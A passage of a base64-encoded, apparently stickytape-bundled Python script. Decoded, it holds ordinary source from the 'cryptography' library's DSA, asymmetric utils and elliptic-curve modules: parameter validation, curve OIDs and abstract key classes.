mFtZXRlck51bWJlcnMgcCwgcSwgYW5kIGcgYXJndW1lbnRzIG11c3QgYmUgaW50ZWdlcnMuIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3AgPSBwXHJcbiAgICAgICAgc2VsZi5fcSA9IHFcclxuICAgICAgICBzZWxmLl9nID0gZ1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHAoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3FcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBnKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZ1xyXG5cclxuICAgIGRlZiBwYXJhbWV0ZXJzKHNlbGYsIGJhY2tlbmQ6IHR5cGluZy5BbnkgPSBOb25lKSAtPiBEU0FQYXJhbWV0ZXJzOlxyXG4gICAgICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IChcclxuICAgICAgICAgICAgYmFja2VuZCBhcyBvc3NsLFxyXG4gICAgICAgIClcclxuXHJcbiAgICAgICAgcmV0dXJuIG9zc2wubG9hZF9kc2FfcGFyYW1ldGVyX251bWJlcnMoc2VsZilcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIERTQVBhcmFtZXRlck51bWJlcnMpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYucCA9PSBvdGhlci5wIGFuZCBzZWxmLnEgPT0gb3RoZXIucSBhbmQgc2VsZi5nID09IG90aGVyLmdcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgICI8RFNBUGFyYW1ldGVyTnVtYmVycyhwPXtzZWxmLnB9LCBxPXtzZWxmLnF9LCAiXHJcbiAgICAgICAgICAgICJnPXtzZWxmLmd9KT4iLmZvcm1hdChzZWxmPXNlbGYpXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmNsYXNzIERTQVB1YmxpY051bWJlcnM6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgeTogaW50LCBwYXJhbWV0ZXJfbnVtYmVyczogRFNBUGFyYW1ldGVyTnVtYmVycyk6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoeSwgaW50KTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJEU0FQdWJsaWNOdW1iZXJzIHkgYXJndW1lbnQgbXVzdCBiZSBhbiBpbnRlZ2VyLiIpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHBhcmFtZXRlcl9udW1iZXJzLCBEU0FQYXJhbWV0ZXJOdW1iZXJzKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgInBhcmFtZXRlcl9udW1iZXJzIG11c3QgYmUgYSBEU0FQYXJhbWV0ZXJOdW1iZXJzIGluc3RhbmNlLiJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLl95ID0geVxyXG4gICAgICAgIHNlbGYuX3BhcmFtZXRlcl9udW1iZXJzID0gcGFyYW1ldGVyX251bWJlcnNcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB5KHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5feVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHBhcmFtZXRlcl9udW1iZXJzKHNlbGYpIC0+IERTQVBhcmFtZXRlck51bWJlcnM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3BhcmFtZXRlcl9udW1iZXJzXHJcblxyXG4gICAgZGVmIHB1YmxpY19rZXkoc2VsZiwgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUpIC0+IERTQVB1YmxpY0tleTpcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCAoXHJcbiAgICAgICAgICAgIGJhY2tlbmQgYXMgb3NzbCxcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBvc3NsLmxvYWRfZHNhX3B1YmxpY19udW1iZXJzKHNlbGYpXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBEU0FQdWJsaWNOdW1iZXJzKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgIHNlbGYueSA9PSBvdGhlci55XHJcbiAgICAgICAgICAgIGFuZCBzZWxmLnBhcmFtZXRlcl9udW1iZXJzID09IG90aGVyLnBhcmFtZXRlcl9udW1iZXJzXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgIjxEU0FQdWJsaWNOdW1iZXJzKHk9e3NlbGYueX0sICJcclxuICAgICAgICAgICAgInBhcmFtZXRlcl9udW1iZXJzPXtzZWxmLnBhcmFtZXRlcl9udW1iZXJzfSk+Ii5mb3JtYXQoc2VsZj1zZWxmKVxyXG4gICAgICAgIClcclxuXHJcblxyXG5jbGFzcyBEU0FQcml2YXRlTnVtYmVyczpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB4OiBpbnQsIHB1YmxpY19udW1iZXJzOiBEU0FQdWJsaWNOdW1iZXJzKTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh4LCBpbnQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkRTQVByaXZhdGVOdW1iZXJzIHggYXJndW1lbnQgbXVzdCBiZSBhbiBpbnRlZ2VyLiIpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHB1YmxpY19udW1iZXJzLCBEU0FQdWJsaWNOdW1iZXJzKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgInB1YmxpY19udW1iZXJzIG11c3QgYmUgYSBEU0FQdWJsaWNOdW1iZXJzIGluc3RhbmNlLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX3B1YmxpY19udW1iZXJzID0gcHVibGljX251bWJlcnNcclxuICAgICAgICBzZWxmLl94ID0geFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHgoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl94XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcHVibGljX251bWJlcnMoc2VsZikgLT4gRFNBUHVibGljTnVtYmVyczpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcHVibGljX251bWJlcnNcclxuXHJcbiAgICBkZWYgcHJpdmF0ZV9rZXkoc2VsZiwgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUpIC0+IERTQVByaXZhdGVLZXk6XHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgKFxyXG4gICAgICAgICAgICBiYWNrZW5kIGFzIG9zc2wsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gb3NzbC5sb2FkX2RzYV9wcml2YXRlX251bWJlcnMoc2VsZilcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIERTQVByaXZhdGVOdW1iZXJzKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgIHNlbGYueCA9PSBvdGhlci54IGFuZCBzZWxmLnB1YmxpY19udW1iZXJzID09IG90aGVyLnB1YmxpY19udW1iZXJzXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmRlZiBnZW5lcmF0ZV9wYXJhbWV0ZXJzKFxyXG4gICAga2V5X3NpemU6IGludCwgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmVcclxuKSAtPiBEU0FQYXJhbWV0ZXJzOlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZCBhcyBvc3NsXHJcblxyXG4gICAgcmV0dXJuIG9zc2wuZ2VuZXJhdGVfZHNhX3BhcmFtZXRlcnMoa2V5X3NpemUpXHJcblxyXG5cclxuZGVmIGdlbmVyYXRlX3ByaXZhdGVfa2V5KFxyXG4gICAga2V5X3NpemU6IGludCwgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmVcclxuKSAtPiBEU0FQcml2YXRlS2V5OlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZCBhcyBvc3NsXHJcblxyXG4gICAgcmV0dXJuIG9zc2wuZ2VuZXJhdGVfZHNhX3ByaXZhdGVfa2V5X2FuZF9wYXJhbWV0ZXJzKGtleV9zaXplKVxyXG5cclxuXHJcbmRlZiBfY2hlY2tfZHNhX3BhcmFtZXRlcnMocGFyYW1ldGVyczogRFNBUGFyYW1ldGVyTnVtYmVycykgLT4gTm9uZTpcclxuICAgIGlmIHBhcmFtZXRlcnMucC5iaXRfbGVuZ3RoKCkgbm90IGluIFsxMDI0LCAyMDQ4LCAzMDcyLCA0MDk2XTpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAicCBtdXN0IGJlIGV4YWN0bHkgMTAyNCwgMjA0OCwgMzA3Miwgb3IgNDA5NiBiaXRzIGxvbmciXHJcbiAgICAgICAgKVxyXG4gICAgaWYgcGFyYW1ldGVycy5xLmJpdF9sZW5ndGgoKSBub3QgaW4gWzE2MCwgMjI0LCAyNTZdOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoInEgbXVzdCBiZSBleGFjdGx5IDE2MCwgMjI0LCBvciAyNTYgYml0cyBsb25nIilcclxuXHJcbiAgICBpZiBub3QgKDEgPCBwYXJhbWV0ZXJzLmcgPCBwYXJhbWV0ZXJzLnApOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoImcsIHAgZG9uXCd0IHNhdGlzZnkgMSA8IGcgPCBwLiIpXHJcblxyXG5cclxuZGVmIF9jaGVja19kc2FfcHJpdmF0ZV9udW1iZXJzKG51bWJlcnM6IERTQVByaXZhdGVOdW1iZXJzKSAtPiBOb25lOlxyXG4gICAgcGFyYW1ldGVycyA9IG51bWJlcnMucHVibGljX251bWJlcnMucGFyYW1ldGVyX251bWJlcnNcclxuICAgIF9jaGVja19kc2FfcGFyYW1ldGVycyhwYXJhbWV0ZXJzKVxyXG4gICAgaWYgbnVtYmVycy54IDw9IDAgb3IgbnVtYmVycy54ID49IHBhcmFtZXRlcnMucTpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJ4IG11c3QgYmUgPiAwIGFuZCA8IHEuIilcclxuXHJcbiAgICBpZiBudW1iZXJzLnB1YmxpY19udW1iZXJzLnkgIT0gcG93KHBhcmFtZXRlcnMuZywgbnVtYmVycy54LCBwYXJhbWV0ZXJzLnApOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoInkgbXVzdCBiZSBlcXVhbCB0byAoZyAqKiB4ICUgcCkuIilcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvcHJpbWl0aXZlcy9hc3ltbWV0cmljL3V0aWxzLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iaW5kaW5ncy5fcnVzdCBpbXBvcnQgYXNuMVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgaGFzaGVzXHJcblxyXG5cclxuZGVjb2RlX2Rzc19zaWduYXR1cmUgPSBhc24xLmRlY29kZV9kc3Nfc2lnbmF0dXJlXHJcbmVuY29kZV9kc3Nfc2lnbmF0dXJlID0gYXNuMS5lbmNvZGVfZHNzX3NpZ25hdHVyZVxyXG5cclxuXHJcbmNsYXNzIFByZWhhc2hlZDpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBhbGdvcml0aG06IGhhc2hlcy5IYXNoQWxnb3JpdGhtKTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShhbGdvcml0aG0sIGhhc2hlcy5IYXNoQWxnb3JpdGhtKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJFeHBlY3RlZCBpbnN0YW5jZSBvZiBIYXNoQWxnb3JpdGhtLiIpXHJcblxyXG4gICAgICAgIHNlbGYuX2FsZ29yaXRobSA9IGFsZ29yaXRobVxyXG4gICAgICAgIHNlbGYuX2RpZ2VzdF9zaXplID0gYWxnb3JpdGhtLmRpZ2VzdF9zaXplXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZGlnZXN0X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9kaWdlc3Rfc2l6ZVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL2FzeW1tZXRyaWMvZWMucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IGFiY1xyXG5pbXBvcnQgdHlwaW5nXHJcbmltcG9ydCB3YXJuaW5nc1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5fb2lkIGltcG9ydCBPYmplY3RJZGVudGlmaWVyXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzIGltcG9ydCBfc2VyaWFsaXphdGlvbiwgaGFzaGVzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMgaW1wb3J0IChcclxuICAgIHV0aWxzIGFzIGFzeW1fdXRpbHMsXHJcbilcclxuXHJcblxyXG5jbGFzcyBFbGxpcHRpY0N1cnZlT0lEOlxyXG4gICAgU0VDUDE5MlIxID0gT2JqZWN0SWRlbnRpZmllcigiMS4yLjg0MC4xMDA0NS4zLjEuMSIpXHJcbiAgICBTRUNQMjI0UjEgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuMTMyLjAuMzMiKVxyXG4gICAgU0VDUDI1NksxID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjEzMi4wLjEwIilcclxuICAgIFNFQ1AyNTZSMSA9IE9iamVjdElkZW50aWZpZXIoIjEuMi44NDAuMTAwNDUuMy4xLjciKVxyXG4gICAgU0VDUDM4NFIxID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjEzMi4wLjM0IilcclxuICAgIFNFQ1A1MjFSMSA9IE9iamVjdElkZW50aWZpZXIoIjEuMy4xMzIuMC4zNSIpXHJcbiAgICBCUkFJTlBPT0xQMjU2UjEgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuMzYuMy4zLjIuOC4xLjEuNyIpXHJcbiAgICBCUkFJTlBPT0xQMzg0UjEgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuMzYuMy4zLjIuOC4xLjEuMTEiKVxyXG4gICAgQlJBSU5QT09MUDUxMlIxID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjM2LjMuMy4yLjguMS4xLjEzIilcclxuICAgIFNFQ1QxNjNLMSA9IE9iamVjdElkZW50aWZpZXIoIjEuMy4xMzIuMC4xIilcclxuICAgIFNFQ1QxNjNSMiA9IE9iamVjdElkZW50aWZpZXIoIjEuMy4xMzIuMC4xNSIpXHJcbiAgICBTRUNUMjMzSzEgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuMTMyLjAuMjYiKVxyXG4gICAgU0VDVDIzM1IxID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjEzMi4wLjI3IilcclxuICAgIFNFQ1QyODNLMSA9IE9iamVjdElkZW50aWZpZXIoIjEuMy4xMzIuMC4xNiIpXHJcbiAgICBTRUNUMjgzUjEgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuMTMyLjAuMTciKVxyXG4gICAgU0VDVDQwOUsxID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjEzMi4wLjM2IilcclxuICAgIFNFQ1Q0MDlSMSA9IE9iamVjdElkZW50aWZpZXIoIjEuMy4xMzIuMC4zNyIpXHJcbiAgICBTRUNUNTcxSzEgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuMTMyLjAuMzgiKVxyXG4gICAgU0VDVDU3MVIxID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjEzMi4wLjM5IilcclxuXHJcblxyXG5jbGFzcyBFbGxpcHRpY0N1cnZlKG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBuYW1lKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgbmFtZSBvZiB0aGUgY3VydmUuIGUuZy4gc2VjcDI1NnIxLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICAiIiJcclxuICAgICAgICBCaXQgc2l6ZSBvZiBhIHNlY3JldCBzY2FsYXIgZm9yIHRoZSBjdXJ2ZS5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5jbGFzcyBFbGxpcHRpY0N1cnZlU2lnbmF0dXJlQWxnb3JpdGhtKG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBhbGdvcml0aG0oXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gdHlwaW5nLlVuaW9uW2FzeW1fdXRpbHMuUHJlaGFzaGVkLCBoYXNoZXMuSGFzaEFsZ29yaXRobV06XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIGRpZ2VzdCBhbGdvcml0aG0gdXNlZCB3aXRoIHRoaXMgc2lnbmF0dXJlLlxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbmNsYXNzIEVsbGlwdGljQ3VydmVQcml2YXRlS2V5KG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZXhjaGFuZ2UoXHJcbiAgICAgICAgc2VsZiwgYWxnb3JpdGhtOiAiRUNESCIsIHBlZXJfcHVibGljX2tleTogIkVsbGlwdGljQ3VydmVQdWJsaWNLZXkiXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFBlcmZvcm1zIGEga2V5IGV4Y2hhbmdlIG9wZXJhdGlvbiB1c2luZyB0aGUgcHJvdmlkZWQgYWxnb3JpdGhtIHdpdGggdGhlXHJcbiAgICAgICAgcHJvdmlkZWQgcGVlclwncyBwdWJsaWMga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwdWJsaWNfa2V5KHNlbGYpIC0+ICJFbGxpcHRpY0N1cnZlUHVibGljS2V5IjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleSBmb3IgdGhpcyBwcml2YXRlIGtleS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBjdXJ2ZShzZWxmKSAtPiBFbGxpcHRpY0N1cnZlOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBFbGxpcHRpY0N1cnZlIHRoYXQgdGhpcyBrZXkgaXMgb24uXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYga2V5X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEJpdCBzaXplIG9mIGEgc2VjcmV0IHNjYWxhciBmb3IgdGhlIGN1cnZlLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBzaWduKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgc2lnbmF0dXJlX2FsZ29yaXRobTogRWxsaXB0aWNDdXJ2ZVNpZ25hdHVyZUFsZ29yaXRobSxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2lnbnMgdGhlIGRhdGFcclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHJpdmF0ZV9udW1iZXJzKHNlbGYpIC0+ICJFbGxpcHRpY0N1cnZlUHJpdmF0ZU51bWJlcnMiOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgYW4gRWxsaXB0aWNDdXJ2ZVByaXZhdGVOdW1iZXJzLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwcml2YXRlX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IF9zZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogX3NlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdCxcclxuICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobTogX3NlcmlhbGl6YXRpb24uS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb24sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIGtleSBzZXJpYWxpemVkIGFzIGJ5dGVzLlxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbkVsbGlwdGljQ3VydmVQcml2YXRlS2V5V2l0aFNlcmlhbGl6YXRpb24gPSBFbGxpcHRpY0N1cnZlUHJpdmF0ZUtleVxyXG5cclxuXHJcbmNsYXNzIEVsbGlwdGljQ3VydmVQdWJsaWNLZXkobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGN1cnZlKHNlbGYpIC0+IEVsbGlwdGljQ3VydmU6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIEVsbGlwdGljQ3VydmUgdGhhdCB0aGlzIGtleSBpcyBvbi5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBrZXlfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQml0IHNpemUgb2YgYSBzZWNyZXQgc2NhbGFyIGZvciB0aGUgY3VydmUuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHB1YmxpY19udW1iZXJzKHNlbGYpIC0+ICJFbGxpcHRpY0N1cnZlUHVibGljTnVtYmVycyI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhbiBFbGxpcHRpY0N1cnZlUHVibGljTnVtYmVycy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IF9zZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogX3NlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBrZXkgc2VyaWFsaXplZCBhcyBieXRlcy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgdmVyaWZ5KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgc2lnbmF0dXJlOiBieXRlcyxcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBzaWduYXR1cmVfYWxnb3JpdGhtOiBFbGxpcHRpY0N1cnZlU2lnbmF0dXJlQWxnb3JpdGhtLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFZlcmlmaWVzIHRoZSBzaWduYXR1cmUgb2YgdGhlIGRhdGEuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZnJvbV9lbmNvZGVkX3BvaW50KFxyXG4gICAgICAgIGNscywgY3VydmU6IEVsbGlwdGljQ3VydmUsIGRhdGE6IGJ5dGVzXHJcbiAgICApIC0+ICJFbGxpcHRpY0N1cnZlUHVibGljS2V5IjpcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXMoImRhdGEiLCBkYXRhKVxyXG5cclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShjdXJ2ZSwgRWxsaXB0aWNDdXJ2ZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiY3VydmUgbXVzdCBiZSBhbiBFbGxpcHRpY0N1cnZlIGluc3RhbmNlIilcclxuXHJcbiAgICAgICAgaWYgbGVuKGRhdGEpID09IDA6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoImRhdGEgbXVzdCBub3QgYmUgYW4gZW1wdHkgYnl0ZSBzdHJpbmciKVxyXG5cclxuICAgICAgICBpZiBkYXRhWzBdIG5vdCBpbiBbMHgwMiwgMHgwMywgMHgwNF06XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlVuc3VwcG9ydGVkIGVsbGlwdGljIGN1cnZlIHBvaW50IHR5cGUiKVxyXG5cclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kXHJcblxyXG4gICAgICAgIHJldHVybiBiYWNrZW5kLmxvYWRfZWxsaXB0aWNfY3VydmVfcHVibGljX2J5dGVzKGN1cnZlLCBkYXRhKVxyXG5cclxuXHJcbkVsbGlwdGljQ3VydmVQdWJsaWNLZXlXaXRoU2VyaWFsaXphdGlvbiA9IEVsbGlwdGljQ3VydmVQdWJsaWNLZXlcclxuXHJcblxyXG5jbGFzcyBTRUNUNTcxUjEoRWxsaXB0aWNDdXJ2ZSk6XHJcbiAgICBuYW1lID0gInNlY3Q1NzFyMSJcclxuICAgIGtleV9zaXplID0gNTcwXHJcblxyXG5cclxuY2xhc3MgU0VDVDQwOVIxKEVsbGlwdGljQ3VydmUpOlxyXG4gICAgbmFtZSA9ICJzZWN0NDA5cjEiXHJcbiAgICBrZXlfc2l6ZSA9IDQwOVxyXG5cclxuXHJcbmNsYXNzIFN